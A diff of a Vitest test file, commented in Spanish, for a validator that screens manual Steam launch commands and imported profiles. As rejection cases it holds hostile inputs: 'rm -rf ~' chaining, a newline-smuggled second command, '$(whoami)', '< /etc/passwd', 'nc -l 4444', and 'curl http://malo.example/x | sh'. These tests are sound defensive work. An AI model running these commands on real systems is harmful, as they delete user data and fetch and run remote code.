@@ -1,37 +1,168 @@
 import { describe, expect, it } from 'vitest';
 import {
+  MAX_MANUAL_COMMAND_LENGTH,
   buildProfileCommand,
-  classifyParameter,
-  isEnvParameter,
-  joinCommand,
+  checkManualCommand,
 } from './command';
-import type { CommunityRecommendation, GameEngine, GameRules, Param, Profile } from './types';
+import type { GameRules, Profile } from './types';
+// Catálogo real de la app. Se importa tal cual para que el test no pueda
+// desincronizarse de lo que el backend carga con `include_str!`.
+import catalogoJuegos from '../../src-tauri/games.json';
 
-/** Parámetro mínimo válido; cada test sobrescribe solo lo que le importa. */
-const param = (over: Partial<Param> = {}): Param => ({
-  kind: 'env',
-  value: 'DXVK_HUD=0',
-  title: '',
-  why: '',
-  impact: 'low',
-  requires: [],
-  default_on: false,
-  evidence: 'docs',
-  proton_only: false,
-  ...over,
+describe('checkManualCommand: comandos normales', () => {
+  it('acepta un comando que solo son variables y %command%', () => {
+    const r = checkManualCommand('DXVK_HUD=fps %command%');
+    expect(r.safe).toBe(true);
+    expect(r.reason).toBe('');
+  });
+
+  it('acepta envoltorios conocidos', () => {
+    for (const cmd of [
+      'gamemoderun mangohud %command%',
+      'mangohud %command% -novid',
+      'gamescope -W 1920 -H 1080 -f -- %command%',
+      'prime-run %command%',
+      'PROTON_ENABLE_NVAPI=1 gamemoderun %command%',
+    ]) {
+      expect(checkManualCommand(cmd).safe, cmd).toBe(true);
+    }
+  });
+
+  it('acepta argumentos con rutas relativas y valores raros', () => {
+    // `-w 1920x1080`, `--hdr-enabled`, etc. no son rutas del sistema.
+    expect(checkManualCommand('gamescope -w 1920 -h 1080 -- %command%').safe).toBe(true);
+  });
+
+  it('no confunde una bandera del juego con el programa', () => {
+    // Regresión: todo lo que va DESPUÉS de `%command%` son argumentos del juego.
+    // Antes se buscaba el programa en la línea entera y `-novid` se tomaba como
+    // ejecutable, así que cualquier comando con banderas se rechazaba.
+    for (const cmd of [
+      '%command% -novid',
+      'PROTON_ENABLE_NVAPI=1 %command% -novid',
+      'mangohud %command% -dx11 -novid',
+      'DXVK_HUD=fps %command% -console',
+    ]) {
+      expect(checkManualCommand(cmd).safe, cmd).toBe(true);
+    }
+  });
+
+  it('rechaza un comando sin %command% y sin programa', () => {
+    const r = checkManualCommand('DXVK_HUD=fps');
+    expect(r.safe).toBe(false);
+    expect(r.reason).toContain('%command%');
+  });
+
+  it('expone el programa detectado', () => {
+    expect(checkManualCommand('gamemoderun %command%').program).toBe('gamemoderun');
+    // La asignación de entorno no es el programa.
+    expect(checkManualCommand('DXVK_HUD=fps mangohud %command%').program).toBe('mangohud');
+  });
 });
 
-const rules = (params: Param[]): GameRules => ({
-  name: 'Test',
-  appid: 1,
-  bottleneck: '',
-  summary: '',
-  params,
-  tips: [],
-  has_rules: true,
+describe('checkManualCommand: encadenar órdenes', () => {
+  it('rechaza punto y coma', () => {
+    const r = checkManualCommand('%command%; rm -rf ~');
+    expect(r.safe).toBe(false);
+    expect(r.reason).toContain(';');
+  });
+
+  it('rechaza tuberías y && / ||', () => {
+    for (const cmd of ['%command% | bash', '%command% && curl x', '%command% || true']) {
+      expect(checkManualCommand(cmd).safe, cmd).toBe(false);
+    }
+  });
+
+  it('rechaza sustitución de órdenes', () => {
+    for (const cmd of ['$(whoami) %command%', '`id` %command%', '%command% $HOME']) {
+      expect(checkManualCommand(cmd).safe, cmd).toBe(false);
+    }
+  });
+
+  it('rechaza redirecciones', () => {
+    for (const cmd of ['%command% > /tmp/x', '%command% < /etc/passwd']) {
+      expect(checkManualCommand(cmd).safe, cmd).toBe(false);
+    }
+  });
+
+  it('rechaza saltos de línea, que esconderían una segunda orden', () => {
+    const r = checkManualCommand('mangohud %command%\nrm -rf ~');
+    expect(r.safe).toBe(false);
+    expect(r.reason).toContain('salto de línea');
+  });
 });
 
-const profile = (over: Partial<Profile> = {}): Profile => ({
+describe('checkManualCommand: ejecutables no permitidos', () => {
+  it('rechaza binarios arbitrarios', () => {
+    for (const cmd of ['curl http://x | sh', 'bash -c id', 'python3 x.py', 'nc -l 4444']) {
+      expect(checkManualCommand(cmd).safe, cmd).toBe(false);
+    }
+  });
+
+  it('rechaza rutas absolutas aunque el programa sea conocido', () => {
+    // El punto: un comando legítimo se resuelve por PATH. Una ruta concreta
+    // apunta a un binario cualquiera que el atacante podría haber colocado.
+    const r = checkManualCommand('/usr/local/bin/steam %command%');
+    expect(r.safe).toBe(false);
+    expect(r.reason).toContain('ruta del sistema');
+
+    expect(checkManualCommand('/home/u/.local/bin/gamemoderun %command%').safe).toBe(false);
+    expect(checkManualCommand('~/bin/mangohud %command%').safe).toBe(false);
+  });
+
+  it('rechaza vacío y comando demasiado largo', () => {
+    expect(checkManualCommand('   ').safe).toBe(false);
+    expect(checkManualCommand('mangohud %command% ' + 'a'.repeat(MAX_MANUAL_COMMAND_LENGTH)).safe).toBe(
+      false
+    );
+  });
+});
+
+describe('buildProfileCommand: un perfil importado no impone su comando', () => {
+  const rules: GameRules = {
+    appid: 440,
+    name: 'TF2',
+    params: [],
+  } as unknown as GameRules;
+
+  const baseProfile = {
+    id: 'p1',
+    name: 'Perfil',
+    appid: 440,
+    engine: null,
+    enabled_params: [],
+    selected_community_recs: [],
+    selected_engine_recs: [],
+    use_manual_command: true,
+  } as unknown as Profile;
+
+  it('usa el comando manual si es seguro', () => {
+    const profile = { ...baseProfile, manual_command: 'gamemoderun %command%' } as Profile;
+    expect(buildProfileCommand(profile, rules, [], null, [])).toBe('gamemoderun %command%');
+  });
+
+  it('ignora un comando manual peligroso y cae al comando normal', () => {
+    // El caso real: el usuario importa un .json de dudosa procedencia y el perfil
+    // trae `use_manual_command: true` con una orden encadenada.
+    const profile = {
+      ...baseProfile,
+      manual_command: '%command%; curl http://malo.example/x | sh',
+    } as Profile;
+
+    const cmd = buildProfileCommand(profile, rules, [], null, []);
+    expect(cmd).not.toContain('curl');
+    // Sin selecciones, el comando normal es el marcador de Steam.
+    expect(cmd).toBe('%command%');
+  });
+
+  it('ignora un comando manual con ruta absoluta', () => {
+    const profile = { ...baseProfile, manual_command: '/tmp/evil %command%' } as Profile;
+    expect(buildProfileCommand(profile, rules, [], null, [])).toBe('%command%');
+  });
+});
+
+// Perfil de prueba reutilizado por los tests de generación de comandos.
+const perfil = (over: Partial<Profile> = {}): Profile => ({
   id: 'p1',
   name: 'Perfil',
   appid: 1,
@@ -40,202 +171,187 @@ const profile = (over: Partial<Profile> = {}): Profile => ({
   selected_community_recs: [],
   selected_engine_recs: [],
   force_proton: false,
-  expert_mode: false,
+  expert_mode: true,
+  manual_command: undefined,
   use_manual_command: false,
+  notes: undefined,
   created_at: '',
   updated_at: '',
+  order: 1,
   ...over,
 });
 
-const engine: GameEngine = { name: 'Unity', version: '2022', api: 'vulkan' };
+// Reglas mínimas con los envoltorios indicados.
+const reglas = (wrappers: string[]): GameRules => ({
+  name: 'Juego',
+  appid: 1,
+  bottleneck: '',
+  summary: '',
+  has_rules: true,
+  tips: [],
+  params: wrappers.map((value) => ({
+    kind: 'wrapper',
+    value,
+    impact: 'medio',
+    default_on: false,
+    title: value,
+    why: '',
+    evidence: 'heuristica',
+    requires: [],
+    proton_only: false,
+  })),
+});
 
-describe('isEnvParameter', () => {
-  it('detecta variables de entorno por el signo igual', () => {
-    expect(isEnvParameter('DXVK_HUD=0')).toBe(true);
-    expect(isEnvParameter('WINE_FULLSCREEN_FSR=1')).toBe(true);
+describe('coherencia entre lo que la app genera y lo que acepta', () => {
+  // El fallo real: con `game-performance` activado, "Editar manualmente" copiaba
+  // el comando generado al editor y el validador lo rechazaba por "no ser un
+  // lanzador conocido". Es decir, la app no aceptaba su propio comando, y además
+  // avisaba de que "un perfil importado puede traer cualquier cosa" cuando el
+  // comando lo había construido la propia app.
+
+
+  it('todo envoltorio del catálogo se acepta como comando manual', () => {
+    // Cada uno por separado y todos juntos: es la forma en que aparecen en
+    // games.json y en las recomendaciones.
+    const envoltorios = [
+      'game-performance',
+      'scx_lavd',
+      'prime-run',
+      'vkbasalt',
+      'obs-gamecapture',
+      'gamemoderun',
+      'mangohud',
+      'gamescope',
+    ];
+    for (const w of envoltorios) {
+      const r = checkManualCommand(`${w} %command%`);
+      expect(r.safe, `${w} debería ser válido: ${r.reason}`).toBe(true);
+    }
+    expect(checkManualCommand(envoltorios.join(' ') + ' %command%').safe).toBe(true);
   });
 
-  it('detecta variables de entorno por prefijo, aunque no lleven "="', () => {
-    for (const p of ['PROTON_NO_ESYNC', 'DXVK_ASYNC', 'VKD3D_X', 'WINE_Y', 'AMD_Z', 'RADV_W', '__GL_SHADER_DISK_CACHE']) {
-      expect(isEnvParameter(p), p).toBe(true);
+  it('el comando generado con game-performance pasa el validador', () => {
+    // Regresión exacta del aviso reportado.
+    const rules = reglas(['game-performance']);
+    const generado = buildProfileCommand(perfil({ enabled_params: [true] }), rules, [], null, []);
+
+    expect(generado).toBe('game-performance %command%');
+    expect(checkManualCommand(generado).safe).toBe(true);
+  });
+
+  it('cualquier comando que genere la app es aceptable tal cual', () => {
+    // Invariante general: copiar el comando al editor manual nunca debe
+    // producir un error. Se prueba la matriz de envoltorios del catálogo.
+    for (const w of ['game-performance', 'scx_lavd', 'mangohud', 'gamemoderun', 'gamescope']) {
+      const rules = reglas([w]);
+      const generado = buildProfileCommand(perfil({ enabled_params: [true] }), rules, [], null, []);
+      const check = checkManualCommand(generado);
+      expect(check.safe, `generado=${generado} motivo=${check.reason}`).toBe(true);
     }
   });
 
-  it('no confunde argumentos con variables de entorno', () => {
-    expect(isEnvParameter('-novid')).toBe(false);
-    expect(isEnvParameter('+fps_max 120')).toBe(false);
-    expect(isEnvParameter('gamemoderun')).toBe(false);
+  it('sigue rechazando un lanzador inventado', () => {
+    // Que la lista crezca no debe abrir la puerta a cualquier cosa.
+    const r = checkManualCommand('curl http://malo.example/x | sh %command%');
+    expect(r.safe).toBe(false);
   });
 });
 
-describe('classifyParameter', () => {
-  it('clasifica variables de entorno', () => {
-    expect(classifyParameter('DXVK_HUD=fps')).toBe('env');
+describe('catálogo games.json ↔ validador de comandos', () => {
+  // El test anterior fija una lista de envoltorios escrita a mano; si alguien
+  // añade uno nuevo a games.json y no aquí, nadie se enteraría hasta que un
+  // usuario pulsara "Editar manualmente" y viera el comando rechazado.
+  //
+  // Este test lee el catálogo REAL y comprueba la invariante de verdad:
+  // todo lo que el catálogo puede poner en un comando tiene que ser aceptable.
+
+  // El JSON trae `has_rules`/`tips` implícitos; se normaliza al tipo de la app.
+  const catalogo = catalogoJuegos as unknown as GameRules[];
+
+  /** Copia con los campos que el JSON no trae (son de tipo, no de datos). */
+  const normalizar = (juego: GameRules): GameRules => ({
+    ...juego,
+    has_rules: true,
+    tips: juego.tips ?? [],
+    bottleneck: juego.bottleneck ?? '',
+    summary: juego.summary ?? '',
   });
 
-  it('reconoce los envoltorios conocidos', () => {
-    for (const w of ['gamemoderun', 'mangohud', 'gamescope']) {
-      expect(classifyParameter(w), w).toBe('wrapper');
+  it('el catálogo se lee y tiene juegos', () => {
+    // Si el archivo cambia de forma, este test debe fallar aquí y no con un
+    // error críptico más abajo.
+    expect(Array.isArray(catalogo)).toBe(true);
+    expect(catalogo.length).toBeGreaterThan(0);
+    expect(catalogo.some((j) => (j.params ?? []).length > 0)).toBe(true);
+  });
+
+  it('todo envoltorio del catálogo pasa el validador', () => {
+    const envoltorios = new Set<string>();
+    for (const juego of catalogo) {
+      for (const p of juego.params ?? []) {
+        if (p.kind === 'wrapper') envoltorios.add(p.value);
+      }
+    }
+    expect(envoltorios.size).toBeGreaterThan(0);
+
+    for (const w of [...envoltorios].sort()) {
+      const check = checkManualCommand(`${w} %command%`);
+      expect(check.safe, `games.json declara el envoltorio «${w}» como kind:"wrapper" pero el validador no lo acepta: ${check.reason}`).toBe(true);
     }
   });
 
-  it('todo lo demás es argumento', () => {
-    expect(classifyParameter('-novid')).toBe('arg');
-    expect(classifyParameter('+fps_max')).toBe('arg');
-    // Un envoltorio desconocido se trata como argumento, no como wrapper
-    expect(classifyParameter('prime-run')).toBe('arg');
-  });
-});
+  it('el comando generado para CADA juego y CADA parámetro válido es aceptable', () => {
+    // La prueba más directa: se genera el comando real de cada juego con cada
+    // parámetro activado, y ese mismo comando tiene que pasar el validador.
+    // Es exactamente lo que ocurre al pulsar "Editar manualmente".
+    let comprobados = 0;
 
-describe('joinCommand', () => {
-  it('respeta el orden canónico: env, wrappers, %command%, args', () => {
-    const cmd = joinCommand({
-      envVars: ['DXVK_HUD=fps'],
-      wrappers: ['gamemoderun', 'mangohud'],
-      args: ['-novid', '+fps_max 120'],
-    });
-    expect(cmd).toBe('DXVK_HUD=fps gamemoderun mangohud %command% -novid +fps_max 120');
-  });
+    for (const juego of catalogo) {
+      const rules = normalizar(juego);
 
-  it('sin ajustes devuelve solo %command%', () => {
-    expect(joinCommand({ envVars: [], wrappers: [], args: [] })).toBe('%command%');
-  });
-});
+      (juego.params ?? []).forEach((_, i) => {
+        const enabled = (juego.params ?? []).map((__, j) => j === i);
+        const generado = buildProfileCommand(
+          perfil({ appid: juego.appid, enabled_params: enabled }),
+          rules,
+          [],
+          null,
+          []
+        );
 
-describe('buildProfileCommand', () => {
-  const baseRules = rules([
-    param({ kind: 'env', value: 'PROTON_NO_ESYNC=1' }),
-    param({ kind: 'wrapper', value: 'gamemoderun' }),
-    param({ kind: 'arg', value: '-novid' }),
-  ]);
+        // Un `config` es texto libre del ajuste dentro del juego: no entra en el
+        // comando, así que el resultado es el comando base.
+        const check = checkManualCommand(generado);
+        expect(
+          check.safe,
+          `juego=«${juego.name}» param=«${juego.params[i].value}» generado=«${generado}» motivo=${check.reason}`
+        ).toBe(true);
+        comprobados++;
+      });
+    }
 
-  it('incluye solo los parámetros activados', () => {
-    const cmd = buildProfileCommand(profile({ enabled_params: [false, true, false] }), baseRules, [], null, []);
-    expect(cmd).toBe('gamemoderun %command%');
-  });
-
-  it('respeta el modo manual por encima de todo lo demás', () => {
-    const cmd = buildProfileCommand(
-      profile({
-        use_manual_command: true,
-        manual_command: 'MI_COMANDO=1 %command% --custom',
-        enabled_params: [true, true, true],
-      }),
-      baseRules,
-      [],
-      null,
-      []
-    );
-    expect(cmd).toBe('MI_COMANDO=1 %command% --custom');
+    // Confirma que el bucle hizo trabajo y no pasó en vacío.
+    expect(comprobados).toBeGreaterThan(20);
   });
 
-  it('si use_manual_command está activo pero no hay texto, usa la selección', () => {
-    const cmd = buildProfileCommand(
-      profile({ use_manual_command: true, manual_command: undefined, enabled_params: [true, false, false] }),
-      baseRules,
-      [],
-      null,
-      []
-    );
-    expect(cmd).toBe('PROTON_NO_ESYNC=1 %command%');
-  });
+  it('el comando generado con TODOS los parámetros activados también es aceptable', () => {
+    for (const juego of catalogo) {
+      const rules = normalizar(juego);
 
-  it('clasifica las recomendaciones de la comunidad en el grupo correcto', () => {
-    const recs: CommunityRecommendation[] = [
-      { parameter: 'DXVK_ASYNC=1', description: '', optimized_for: [] },
-      { parameter: 'mangohud', description: '', optimized_for: [] },
-      { parameter: '-dx11', description: '', optimized_for: [] },
-    ];
-    const cmd = buildProfileCommand(
-      profile({ selected_community_recs: [0, 1, 2] }),
-      rules([]),
-      recs,
-      null,
-      []
-    );
-    expect(cmd).toBe('DXVK_ASYNC=1 mangohud %command% -dx11');
-  });
+      const todoActivo = (juego.params ?? []).map((p) => p.kind !== 'config');
+      const generado = buildProfileCommand(
+        perfil({ appid: juego.appid, enabled_params: todoActivo }),
+        rules,
+        [],
+        null,
+        []
+      );
 
-  it('ignora las recomendaciones de la comunidad no seleccionadas', () => {
-    const recs: CommunityRecommendation[] = [
-      { parameter: 'DXVK_ASYNC=1', description: '', optimized_for: [] },
-      { parameter: 'mangohud', description: '', optimized_for: [] },
-    ];
-    const cmd = buildProfileCommand(profile({ selected_community_recs: [1] }), rules([]), recs, null, []);
-    expect(cmd).toBe('mangohud %command%');
-  });
-
-  it('las recomendaciones del motor son variables de entorno', () => {
-    const cmd = buildProfileCommand(
-      profile({ selected_engine_recs: [0, 2] }),
-      rules([]),
-      [],
-      engine,
-      ['PROTON_FORCE_LARGE_ADDRESS_AWARE=1', 'IGNORADA=1', 'WINE_HIDE_NVIDIA_GPU=1']
-    );
-    expect(cmd).toBe('PROTON_FORCE_LARGE_ADDRESS_AWARE=1 WINE_HIDE_NVIDIA_GPU=1 %command%');
-  });
-
-  it('sin motor, las recomendaciones de motor se ignoran aunque estén marcadas', () => {
-    const cmd = buildProfileCommand(profile({ selected_engine_recs: [0] }), rules([]), [], null, ['X=1']);
-    expect(cmd).toBe('%command%');
-  });
-
-  it('ignora índices de enabled_params fuera de rango sin romperse', () => {
-    // enabled_params más corto que params: los que faltan cuentan como false.
-    // Es el caso que provocaba nulls al serializar en el frontend.
-    const cmd = buildProfileCommand(profile({ enabled_params: [true] }), baseRules, [], null, []);
-    expect(cmd).toBe('PROTON_NO_ESYNC=1 %command%');
-  });
-
-  it('combina las tres fuentes en una sola línea', () => {
-    const recs: CommunityRecommendation[] = [
-      { parameter: 'DXVK_HUD=fps', description: '', optimized_for: [] },
-    ];
-    const cmd = buildProfileCommand(
-      profile({
-        enabled_params: [false, true, true],
-        selected_community_recs: [0],
-        selected_engine_recs: [0],
-      }),
-      baseRules,
-      recs,
-      engine,
-      ['PROTON_FORCE_LARGE_ADDRESS_AWARE=1']
-    );
-    expect(cmd).toBe(
-      'DXVK_HUD=fps PROTON_FORCE_LARGE_ADDRESS_AWARE=1 gamemoderun %command% -novid'
-    );
-  });
-});
-
-describe('buildProfileCommand: parámetros que no son del lanzador', () => {
-  it('un ajuste del juego (`config`) nunca acaba dentro del comando', () => {
-    // Los perfiles por juego traen consejos tipo «usa FSR en Calidad»: llevan
-    // espacios y, si se pegaran al comando, el lanzador de Steam lo rechazaría.
-    const cmd = buildProfileCommand(
-      profile({ enabled_params: [true, true] }),
-      rules([
-        param({ kind: 'env', value: 'DXVK_HUD=0' }),
-        param({ kind: 'config', value: 'Activa FSR dentro del juego' }),
-      ]),
-      [],
-      null,
-      []
-    );
-
-    expect(cmd).toBe('DXVK_HUD=0 %command%');
-    expect(cmd).not.toContain('FSR');
-  });
-
-  it('un argumento de verdad (`arg`) sí va detrás de %command%', () => {
-    const cmd = buildProfileCommand(
-      profile({ enabled_params: [true] }),
-      rules([param({ kind: 'arg', value: '-novid' })]),
-      [],
-      null,
-      []
-    );
-    expect(cmd).toBe('%command% -novid');
+      const check = checkManualCommand(generado);
+      expect(
+        check.safe,
+        `juego=«${juego.name}» con todo activo generado=«${generado}» motivo=${check.reason}`
+      ).toBe(true);
+    }
   });
 });
